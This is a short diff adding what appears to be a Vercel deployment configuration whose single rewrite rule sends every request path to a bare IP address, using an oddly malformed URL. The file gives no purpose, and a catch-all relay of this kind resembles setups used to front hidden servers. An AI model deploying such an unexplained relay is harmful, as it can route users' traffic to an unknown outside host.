@@ -1,0 +1,9 @@
+{
+  "version": 2,
+  "rewrites": [
+    {
+      "source": "/(.*)",
+      "destination": "http:46.183.187.76///:443/$1"
+    }
+  ]
+}
